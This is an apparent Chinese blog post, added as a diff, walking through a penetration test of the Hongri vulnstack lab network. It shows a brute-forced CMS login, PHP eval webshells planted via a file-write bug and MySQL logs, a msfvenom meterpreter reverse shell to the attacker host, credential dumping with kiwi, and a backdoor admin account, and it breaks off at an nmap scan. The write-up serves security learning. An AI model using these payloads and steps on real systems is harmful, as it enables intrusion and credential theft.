@@ -1,0 +1,882 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/feiji.png">
+  <link rel="icon" type="image/png" href="/img/feiji.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="sunzy">
+  <meta name="keywords" content="">
+  <title>shentou - 一路走到黑</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/a11y-light.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Sunzy'blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('https://i.loli.net/2020/10/24/eBR35xZYEbuzSW9.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-05-11 09:00" pubdate>
+        2021年5月11日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.8k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      38
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">shentou</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：1 年前
+                
+              </p>
+            
+            <div class="markdown-body" id="post-body">
+              <p>记一次渗透测试</p>
+<span id="more"></span>
+
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用的靶机是红日安全提供的，地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
+<p>搭建过程中有一点需要注意</p>
+<p>Web服务主机win7有两块网卡，需要在设置中再添加一块网卡</p>
+<p>网卡一连接到<code>VMnet2</code>中，作为内网环境</p>
+<p>网卡二连接到<code>VMnet1</code>中，作为公网环境，并攻击机连到<code>VMnet1</code>中,确保其可以访问网站主页</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511130030032.png" srcset="/img/loading.gif" alt="image-20210511130030032"></p>
+<p>剩下的两台域控主机直接连接到<code>VMnet2</code>中即可，可以与web服务器通信</p>
+<p>修改window10物理机的VMnet1网卡</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511214717086.png" srcset="/img/loading.gif" alt="image-20210511214717086" style="zoom:67%;">
+
+<p>这样物理机和kali都可以访问到靶机网站</p>
+<p><strong>实验拓扑图:</strong></p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511124808522.png" srcset="/img/loading.gif" alt="image-20210511124808522" style="zoom: 50%;">
+
+<ul>
+<li>web服务器(win7): 公网IP:192.168.74.128   内网IP: 192.168.52.143 主机名:stu1</li>
+<li>域成员主机(Windows Server 2003)：192.168.52.141 主机名：root-tvi862ubeh</li>
+<li>域控(Windows Server 2008)：192.168.52.138 主机名：owa</li>
+</ul>
+<p>web服务器有两块网卡，其中192.168.74.128模拟的是公网环境，攻击者可以直接访问，192.168.52.143属于内网，攻击者无法直接访问</p>
+<h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><h2 id="网站探测"><a href="#网站探测" class="headerlink" title="网站探测"></a>网站探测</h2><p>首先访问网站主页: <a target="_blank" rel="noopener" href="http://192.168.74.129/yxcms">http://192.168.74.129/yxcms</a></p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511130446365.png" srcset="/img/loading.gif" alt="image-20210511130446365" style="zoom:67%;">
+
+<p>先扫描一下目录</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511153857974.png" srcset="/img/loading.gif" alt="image-20210511153857974" style="zoom:50%;">
+
+<p>可以看存在很多可以访问的目录，并且这些目录都存在目录遍历漏洞，如<code>/public</code>,可以看到该目录下的很多内容，但是没有想要内容</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511154129595.png" srcset="/img/loading.gif" alt="image-20210511154129595" style="zoom:50%;">
+
+
+
+<h2 id="网站漏洞利用getshell"><a href="#网站漏洞利用getshell" class="headerlink" title="网站漏洞利用getshell"></a>网站漏洞利用getshell</h2><ul>
+<li><p>经过探测网站的后台登录页面是<code>http://192.168.74.129/yxcms/index.php?r=admin/index/login</code></p>
+<p>经过爆破很容易试出密码为<code>123456</code></p>
+<p>成功登录后台</p>
+</li>
+</ul>
+<ul>
+<li><p>尝试搜索网站已发现的漏洞</p>
+<p>这是一个网站常用的CMS，在网上搜索一下是否存在可以直接利用的漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/162886.html">代码审计| yxcms app 1.4.6 漏洞集合</a></p>
+<p>可以看到这个cms还是存在几个很好利用的漏洞的，尝试使用其中文件写入漏洞</p>
+<p>访问<code>http://192.168.74.129/yxcms/index.php?r=admin/set/tpadd&amp;Mname=default</code>，这里可以写入php文件</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511155855512.png" srcset="/img/loading.gif" alt="image-20210511155855512"></p>
+</li>
+</ul>
+<p>写入一句话木马</p>
+<p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210511155949294.png" srcset="/img/loading.gif" alt="image-20210511155949294"></p>
+<p>写入成功后，访问<code>http://192.168.74.129/yxcms/protected/apps/default/view/default/info.php</code>可以看到已经成功写入一句话木马，之后就是用蚁剑连接</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511160216194.png" srcset="/img/loading.gif" alt="image-20210511160216194" style="zoom:50%;">
+
+<p>成功获取shell，并且是system权限，这是由于该网站管理员直接使用<code>administrator</code>登录域控主机，若是在真是环境中获取的是普通用户权限则还需要配合提权，获取system权限</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511160418538.png" srcset="/img/loading.gif" alt="image-20210511160418538"></p>
+<h2 id="使用phpMyAdmin-Getshell"><a href="#使用phpMyAdmin-Getshell" class="headerlink" title="使用phpMyAdmin Getshell"></a>使用phpMyAdmin Getshell</h2><p>扫描<code>http://192.168.74.129/</code></p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511160728113.png" srcset="/img/loading.gif" alt="image-20210511160728113"></p>
+<p>直接使用工具爆破，很容易得到，用户名和密码都为<code>root</code></p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511132208919.png" srcset="/img/loading.gif" alt="image-20210511132208919" style="zoom:50%;">
+
+<p>一开始的想法是利用写<code>into outfile</code>写木马getshell，但是由于网站的<code>secure_file_priv</code>的值为NULL，所以我们不能利用写<code>into outfile</code>写木马getshell</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511161606685.png" srcset="/img/loading.gif" alt="image-20210511161606685" style="zoom:50%;">
+
+<p>但是还有一种方法，就是向mysql日志中写入一句话木马，具体如下:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/103461736#%E5%88%A9%E7%94%A8%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6Getshell">mysql日志木马</a></p>
+<p>执行下列命令</p>
+<div class="hljs"><pre><code class="hljs mysql">set global general_log&#x3D;on;                                     #开启日志
+set global general_log_file&#x3D;&#39;C:&#x2F;phpstudy&#x2F;www&#x2F;yxcms&#x2F;hack.php&#39;;  #设置指定文件为网站日志存放文件
+SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;               		   #执行该语句，会将该命令写入日志文件</code></pre></div>
+
+<p>执行完命令，便可以在网站根目录下看到<code>hack.php</code></p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511162058801.png" srcset="/img/loading.gif" alt="image-20210511162058801"></p>
+<p>浏览器访问<code>http://192.168.74.129/yxcms/hack.php</code>，一句话木马访问成功</p>
+<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210511162146968.png" srcset="/img/loading.gif" alt="image-20210511162146968" style="zoom:50%;">
+
+<h1 id="后渗透攻击"><a href="#后渗透攻击" class="headerlink" title="后渗透攻击"></a>后渗透攻击</h1><p>在拿到了Web服务器的权限后，我们就要尽可能多的搜集该服务器的信息，然后搭建隧道通往内网。</p>
+<p>执行<code>whoami</code> ,<code>ipconfig</code>,<code>net localgroup administrators</code>命令我们知道当前的用户身份是 <code>administrator</code> ，在管理员组中，并且处在域 god 中。该主机有两张网卡，分别是：192.168.74.129，192.168.52.143</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511162608469.png" srcset="/img/loading.gif" alt="image-20210511162608469" style="zoom: 67%;">
+
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511162902010.png" srcset="/img/loading.gif" alt="image-20210511162902010"></p>
+<h2 id="获取MSF-shell"><a href="#获取MSF-shell" class="headerlink" title="获取MSF shell"></a>获取MSF shell</h2><p>使用<code>msf</code>生成木马</p>
+<ul>
+<li><p>kali终端输入<code>msfconsole</code>，进入msf</p>
+</li>
+<li><p>选择带reverse和meterpreter(发送端接受端连接)的payloads进行反弹端口</p>
+<div class="hljs"><pre><code class="hljs awk">use windows<span class="hljs-regexp">/x64/m</span>eterpreter_reverse_tcp</code></pre></div>
+
+<p>输入<code>show options</code>查看方法</p>
+</li>
+<li><p>新开一个终端输入以下命令，生成木马文件，并利用蚁剑上传到目标主机中</p>
+</li>
+</ul>
+<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">msfvenom</span> -p windows/x<span class="hljs-number">64</span>/meterpreter_reverse_tcp lhost=<span class="hljs-number">192.168.74.130</span> lport=<span class="hljs-number">4444</span> -f exe -o <span class="hljs-number">1</span>.exe</code></pre></div>
+
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511163917527.png" srcset="/img/loading.gif" alt="image-20210511163917527" style="zoom: 67%;">
+
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511164107563.png" srcset="/img/loading.gif" alt="image-20210511164107563" style="zoom:67%;">
+
+<ul>
+<li><p>再次输入msfconsole 进入应用，输入<code>use exploit/multi/handler</code>进入管理工具，获取shell权限，命令如下</p>
+<div class="hljs"><pre><code class="hljs routeros">use exploit/multi/handler
+<span class="hljs-builtin-name">set</span> payload windows/x64/meterpreter_reverse_tcp
+<span class="hljs-builtin-name">set</span> lhost kali<span class="hljs-string">&#x27;s ip</span>
+<span class="hljs-string">run</span></code></pre></div>
+
+<p>即可获取shell</p>
+</li>
+</ul>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511165317518.png" srcset="/img/loading.gif" alt="image-20210511165317518" style="zoom:67%;">
+
+
+
+<h2 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h2><p>在<code>meterpreter</code>中运行<code>run windows/gather/smart_hashdump</code>,但是出现错误，提示需要system进程权限</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511182726579.png" srcset="/img/loading.gif" alt="image-20210511182726579" style="zoom:67%;">
+
+<p>使用<code>migrate 388</code>将meterpreter迁移到64位的进程，而且该进程也需要是system权限运行的</p>
+<p>再使用<code>run windows/gather/smart_hashdump</code></p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511183026072.png" srcset="/img/loading.gif" alt="image-20210511183026072" style="zoom:67%;">
+
+<p>接下来是破解该密码</p>
+<p><strong>加载 kiwi模块</strong></p>
+<div class="hljs"><pre><code class="hljs ebnf"><span class="hljs-attribute">load kiwi</span>
+<span class="hljs-attribute">creds_all</span></code></pre></div>
+
+<p>结果如下</p>
+<div class="hljs"><pre><code class="hljs armasm"><span class="hljs-symbol">meterpreter</span> &gt; creds_all
+[+] Running as SYSTEM
+[*] Retrieving all credentials
+<span class="hljs-symbol">msv</span> credentials
+===============
+
+<span class="hljs-symbol">Username</span>       Domain  LM                                NTLM                              SHA1
+--------       ------  --                                ----                              ----
+<span class="hljs-symbol">Administrator</span>  GOD     edea194d76c77d87840ac10a764c7362  <span class="hljs-number">8</span>a963371a63944419ec1adf687bb1be5  <span class="hljs-number">343</span>f44056ed02360aead5618dd42e4614b5f70cf
+<span class="hljs-symbol">STU1$</span>          GOD                                       cde51539f42c2854d74e82db1173dd8c  <span class="hljs-number">50950</span>d918317edf0ab95661a565c6ebf1151fe3b
+
+<span class="hljs-symbol">wdigest</span> credentials
+===================
+
+<span class="hljs-symbol">Username</span>       Domain  Password
+--------       ------  --------
+(null)         (null)  (null)
+<span class="hljs-symbol">Administrator</span>  GOD     hongrisec<span class="hljs-comment">@2019</span>
+<span class="hljs-symbol">STU1$</span>          GOD     <span class="hljs-number">81</span> <span class="hljs-built_in">c2</span> <span class="hljs-number">84</span> <span class="hljs-number">7</span>c a6 <span class="hljs-number">0</span>f <span class="hljs-number">51</span> <span class="hljs-number">4</span>b <span class="hljs-number">41</span> <span class="hljs-number">91</span> b3 <span class="hljs-number">1</span>a <span class="hljs-number">0</span>d <span class="hljs-number">7</span>e <span class="hljs-number">56</span> <span class="hljs-number">32</span> <span class="hljs-number">0</span>e <span class="hljs-number">37</span> <span class="hljs-built_in">c7</span> <span class="hljs-number">77</span> <span class="hljs-built_in">f7</span> <span class="hljs-number">54</span> <span class="hljs-number">09</span> <span class="hljs-built_in">f4</span> <span class="hljs-built_in">f2</span> <span class="hljs-number">8</span>b <span class="hljs-number">54</span> cc <span class="hljs-number">6</span>b <span class="hljs-number">20</span> <span class="hljs-number">7</span>e <span class="hljs-number">9</span>c <span class="hljs-number">56</span> <span class="hljs-number">46</span> e5 ee <span class="hljs-built_in">d9</span> <span class="hljs-built_in">d2</span> <span class="hljs-number">84</span> aa <span class="hljs-number">6</span>a <span class="hljs-number">82</span> <span class="hljs-number">82</span> <span class="hljs-number">58</span> b1 ae bf <span class="hljs-number">47</span> db <span class="hljs-number">9</span>f <span class="hljs-number">53</span> <span class="hljs-number">9</span>e <span class="hljs-built_in">c9</span> <span class="hljs-built_in">a1</span> <span class="hljs-number">5</span>f bb ae <span class="hljs-built_in">a2</span> <span class="hljs-built_in">c3</span> <span class="hljs-number">7</span>f <span class="hljs-number">2</span>d <span class="hljs-number">37</span> <span class="hljs-number">9</span>d <span class="hljs-built_in">c1</span> <span class="hljs-number">9</span>a <span class="hljs-number">25</span> <span class="hljs-number">95</span> <span class="hljs-built_in">f6</span> <span class="hljs-number">49</span> b8 <span class="hljs-built_in">a2</span> <span class="hljs-built_in">f1</span> cb <span class="hljs-number">0</span>a ad <span class="hljs-built_in">f2</span> b2 <span class="hljs-number">27</span> <span class="hljs-built_in">c8</span> <span class="hljs-number">36</span> b2 eb a5 <span class="hljs-built_in">d9</span> <span class="hljs-number">3</span>c <span class="hljs-number">10</span> ca <span class="hljs-number">0</span>c <span class="hljs-number">38</span> <span class="hljs-number">18</span> <span class="hljs-number">63</span> fb <span class="hljs-number">0</span>d <span class="hljs-number">7</span>f <span class="hljs-number">67</span> ec <span class="hljs-number">37</span> <span class="hljs-number">87</span> <span class="hljs-number">84</span> e9 cc <span class="hljs-built_in">f3</span> <span class="hljs-built_in">d8</span> <span class="hljs-number">56</span> <span class="hljs-number">72</span> bc <span class="hljs-number">0</span>c cf e8 <span class="hljs-number">20</span> a7 <span class="hljs-number">93</span> <span class="hljs-number">07</span> <span class="hljs-number">29</span> <span class="hljs-number">3</span>d b5 <span class="hljs-number">48</span> b6 <span class="hljs-number">33</span> de e9 df <span class="hljs-number">3</span>a <span class="hljs-number">73</span> <span class="hljs-number">04</span> <span class="hljs-number">94</span> a7 <span class="hljs-number">90</span> e6 <span class="hljs-built_in">d5</span> <span class="hljs-number">4</span>f ce a8 <span class="hljs-number">88</span> <span class="hljs-number">9</span>e a5 <span class="hljs-number">18</span> <span class="hljs-number">78</span> e4 <span class="hljs-number">43</span> e8 <span class="hljs-number">5</span>b e5 <span class="hljs-number">47</span> dc <span class="hljs-number">0</span>a <span class="hljs-number">34</span> be <span class="hljs-number">79</span> <span class="hljs-number">6</span>a fa fe <span class="hljs-number">7</span>f <span class="hljs-built_in">d5</span> <span class="hljs-built_in">c6</span> <span class="hljs-number">38</span> <span class="hljs-number">48</span> <span class="hljs-number">79</span> <span class="hljs-number">53</span> <span class="hljs-number">7</span>b <span class="hljs-number">3</span>f <span class="hljs-number">8</span>f <span class="hljs-number">9</span>e <span class="hljs-number">78</span> <span class="hljs-number">31</span> cf <span class="hljs-number">35</span> <span class="hljs-number">7</span>b <span class="hljs-number">12</span> <span class="hljs-number">93</span> e7 <span class="hljs-number">3</span>a <span class="hljs-built_in">f1</span> <span class="hljs-number">0</span>c de <span class="hljs-number">90</span> <span class="hljs-built_in">d9</span> e5 <span class="hljs-number">69</span> <span class="hljs-number">02</span> a9 ab <span class="hljs-built_in">c6</span> da <span class="hljs-built_in">f2</span> <span class="hljs-number">09</span> <span class="hljs-number">2</span>f <span class="hljs-number">8</span>a <span class="hljs-number">0</span>a ed <span class="hljs-number">19</span> <span class="hljs-number">44</span> <span class="hljs-number">11</span> <span class="hljs-built_in">c4</span> ba <span class="hljs-number">93</span> <span class="hljs-number">12</span> <span class="hljs-number">73</span> <span class="hljs-number">04</span> <span class="hljs-number">69</span> <span class="hljs-number">3</span>a <span class="hljs-number">31</span> <span class="hljs-number">4</span>e ff b8 a7 <span class="hljs-number">72</span> da <span class="hljs-number">4</span>b <span class="hljs-number">6</span>e ad db e9 <span class="hljs-number">52</span> <span class="hljs-number">7</span>f <span class="hljs-number">88</span> cf <span class="hljs-number">0</span>f <span class="hljs-number">01</span> <span class="hljs-number">92</span> <span class="hljs-number">87</span> <span class="hljs-number">68</span> ba <span class="hljs-number">5</span>a <span class="hljs-built_in">d1</span> <span class="hljs-built_in">d3</span> ec <span class="hljs-number">1</span>f <span class="hljs-built_in">c3</span> b1 a5 <span class="hljs-number">3</span>b <span class="hljs-number">44</span> e5 <span class="hljs-number">7</span>b <span class="hljs-number">9</span>d <span class="hljs-number">2</span>f a9 <span class="hljs-number">28</span> <span class="hljs-number">5</span>b
+
+<span class="hljs-symbol">tspkg</span> credentials
+=================
+
+<span class="hljs-symbol">Username</span>       Domain  Password
+--------       ------  --------
+<span class="hljs-symbol">Administrator</span>  GOD     hongrisec<span class="hljs-comment">@2019</span>
+
+<span class="hljs-symbol">kerberos</span> credentials
+====================
+
+<span class="hljs-symbol">Username</span>       Domain   Password
+--------       ------   --------
+(null)         (null)   (null)
+<span class="hljs-symbol">Administrator</span>  GOD.ORG  hongrisec<span class="hljs-comment">@2019</span>
+<span class="hljs-symbol">stu1$</span>          GOD.ORG  <span class="hljs-number">81</span> <span class="hljs-built_in">c2</span> <span class="hljs-number">84</span> <span class="hljs-number">7</span>c a6 <span class="hljs-number">0</span>f <span class="hljs-number">51</span> <span class="hljs-number">4</span>b <span class="hljs-number">41</span> <span class="hljs-number">91</span> b3 <span class="hljs-number">1</span>a <span class="hljs-number">0</span>d <span class="hljs-number">7</span>e <span class="hljs-number">56</span> <span class="hljs-number">32</span> <span class="hljs-number">0</span>e <span class="hljs-number">37</span> <span class="hljs-built_in">c7</span> <span class="hljs-number">77</span> <span class="hljs-built_in">f7</span> <span class="hljs-number">54</span> <span class="hljs-number">09</span> <span class="hljs-built_in">f4</span> <span class="hljs-built_in">f2</span> <span class="hljs-number">8</span>b <span class="hljs-number">54</span> cc <span class="hljs-number">6</span>b <span class="hljs-number">20</span> <span class="hljs-number">7</span>e <span class="hljs-number">9</span>c <span class="hljs-number">56</span> <span class="hljs-number">46</span> e5 ee <span class="hljs-built_in">d9</span> <span class="hljs-built_in">d2</span> <span class="hljs-number">84</span> aa <span class="hljs-number">6</span>a <span class="hljs-number">82</span> <span class="hljs-number">82</span> <span class="hljs-number">58</span> b1 ae bf <span class="hljs-number">47</span> db <span class="hljs-number">9</span>f <span class="hljs-number">53</span> <span class="hljs-number">9</span>e <span class="hljs-built_in">c9</span> <span class="hljs-built_in">a1</span> <span class="hljs-number">5</span>f bb ae <span class="hljs-built_in">a2</span> <span class="hljs-built_in">c3</span> <span class="hljs-number">7</span>f <span class="hljs-number">2</span>d <span class="hljs-number">37</span> <span class="hljs-number">9</span>d <span class="hljs-built_in">c1</span> <span class="hljs-number">9</span>a <span class="hljs-number">25</span> <span class="hljs-number">95</span> <span class="hljs-built_in">f6</span> <span class="hljs-number">49</span> b8 <span class="hljs-built_in">a2</span> <span class="hljs-built_in">f1</span> cb <span class="hljs-number">0</span>a ad <span class="hljs-built_in">f2</span> b2 <span class="hljs-number">27</span> <span class="hljs-built_in">c8</span> <span class="hljs-number">36</span> b2 eb a5 <span class="hljs-built_in">d9</span> <span class="hljs-number">3</span>c <span class="hljs-number">10</span> ca <span class="hljs-number">0</span>c <span class="hljs-number">38</span> <span class="hljs-number">18</span> <span class="hljs-number">63</span> fb <span class="hljs-number">0</span>d <span class="hljs-number">7</span>f <span class="hljs-number">67</span> ec <span class="hljs-number">37</span> <span class="hljs-number">87</span> <span class="hljs-number">84</span> e9 cc <span class="hljs-built_in">f3</span> <span class="hljs-built_in">d8</span> <span class="hljs-number">56</span> <span class="hljs-number">72</span> bc <span class="hljs-number">0</span>c cf e8 <span class="hljs-number">20</span> a7 <span class="hljs-number">93</span> <span class="hljs-number">07</span> <span class="hljs-number">29</span> <span class="hljs-number">3</span>d b5 <span class="hljs-number">48</span> b6 <span class="hljs-number">33</span> de e9 df <span class="hljs-number">3</span>a <span class="hljs-number">73</span> <span class="hljs-number">04</span> <span class="hljs-number">94</span> a7 <span class="hljs-number">90</span> e6 <span class="hljs-built_in">d5</span> <span class="hljs-number">4</span>f ce a8 <span class="hljs-number">88</span> <span class="hljs-number">9</span>e a5 <span class="hljs-number">18</span> <span class="hljs-number">78</span> e4 <span class="hljs-number">43</span> e8 <span class="hljs-number">5</span>b e5 <span class="hljs-number">47</span> dc <span class="hljs-number">0</span>a <span class="hljs-number">34</span> be <span class="hljs-number">79</span> <span class="hljs-number">6</span>a fa fe <span class="hljs-number">7</span>f <span class="hljs-built_in">d5</span> <span class="hljs-built_in">c6</span> <span class="hljs-number">38</span> <span class="hljs-number">48</span> <span class="hljs-number">79</span> <span class="hljs-number">53</span> <span class="hljs-number">7</span>b <span class="hljs-number">3</span>f <span class="hljs-number">8</span>f <span class="hljs-number">9</span>e <span class="hljs-number">78</span> <span class="hljs-number">31</span> cf <span class="hljs-number">35</span> <span class="hljs-number">7</span>b <span class="hljs-number">12</span> <span class="hljs-number">93</span> e7 <span class="hljs-number">3</span>a <span class="hljs-built_in">f1</span> <span class="hljs-number">0</span>c de <span class="hljs-number">90</span> <span class="hljs-built_in">d9</span> e5 <span class="hljs-number">69</span> <span class="hljs-number">02</span> a9 ab <span class="hljs-built_in">c6</span> da <span class="hljs-built_in">f2</span> <span class="hljs-number">09</span> <span class="hljs-number">2</span>f <span class="hljs-number">8</span>a <span class="hljs-number">0</span>a ed <span class="hljs-number">19</span> <span class="hljs-number">44</span> <span class="hljs-number">11</span> <span class="hljs-built_in">c4</span> ba <span class="hljs-number">93</span> <span class="hljs-number">12</span> <span class="hljs-number">73</span> <span class="hljs-number">04</span> <span class="hljs-number">69</span> <span class="hljs-number">3</span>a <span class="hljs-number">31</span> <span class="hljs-number">4</span>e ff b8 a7 <span class="hljs-number">72</span> da <span class="hljs-number">4</span>b <span class="hljs-number">6</span>e ad db e9 <span class="hljs-number">52</span> <span class="hljs-number">7</span>f <span class="hljs-number">88</span> cf <span class="hljs-number">0</span>f <span class="hljs-number">01</span> <span class="hljs-number">92</span> <span class="hljs-number">87</span> <span class="hljs-number">68</span> ba <span class="hljs-number">5</span>a <span class="hljs-built_in">d1</span> <span class="hljs-built_in">d3</span> ec <span class="hljs-number">1</span>f <span class="hljs-built_in">c3</span> b1 a5 <span class="hljs-number">3</span>b <span class="hljs-number">44</span> e5 <span class="hljs-number">7</span>b <span class="hljs-number">9</span>d <span class="hljs-number">2</span>f a9 <span class="hljs-number">28</span> <span class="hljs-number">5</span>b</code></pre></div>
+
+<p>可以看到密码已经被破解处理</p>
+<div class="hljs"><pre><code class="hljs angelscript">password：<span class="hljs-symbol">hongrisec@</span><span class="hljs-number">2019</span></code></pre></div>
+
+
+
+<h2 id="远程桌面登录"><a href="#远程桌面登录" class="headerlink" title="远程桌面登录"></a>远程桌面登录</h2><p>已经获得了administrator的账号和密码，现在我们既可以使用administrator账号登录，也可以新建账号登录。</p>
+<p>直接使用administrator登录的话可能被管理员发现，所以使用第二种方法</p>
+<div class="hljs"><pre><code class="hljs pgsql">net <span class="hljs-keyword">user</span> hack <span class="hljs-keyword">password</span>  /<span class="hljs-keyword">add</span>
+net localgroup administrators hack /<span class="hljs-keyword">add</span></code></pre></div>
+
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511183802017.png" srcset="/img/loading.gif" alt="image-20210511183802017" style="zoom: 80%;">
+
+<p>查看主机是否开启<code>3389</code>端口</p>
+<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p <span class="hljs-number">3389</span> -v <span class="hljs-number">192.168.74.129</span></code></pre></div>
+
